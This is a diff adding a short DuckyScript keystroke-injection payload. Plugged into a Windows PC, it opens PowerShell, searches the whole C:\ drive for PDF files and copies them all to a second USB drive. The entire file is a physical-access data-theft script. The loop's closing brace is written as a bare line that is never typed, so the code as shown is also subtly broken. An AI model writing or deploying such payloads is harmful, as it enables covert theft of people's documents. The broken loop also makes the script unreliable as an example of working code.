@@ -1,0 +1,23 @@
+DELAY 250
+REM Open PowerShell
+GUI r
+DELAY 250
+STRING powershell
+ENTER
+DELAY 250
+
+REM Search for all .pdf files on the entire PC
+STRING Get-ChildItem -Path C:\ -Filter "*.pdf" -Recurse | ForEach-Object {
+ENTER
+DELAY 250
+
+REM Copy each .pdf file to the second USB drive (assuming it's mounted as D:\)
+STRING Copy-Item -Path $_.FullName -Destination "D:\"
+ENTER
+DELAY 250
+}
+
+REM Close PowerShell
+STRING exit
+ENTER
+DELAY 250
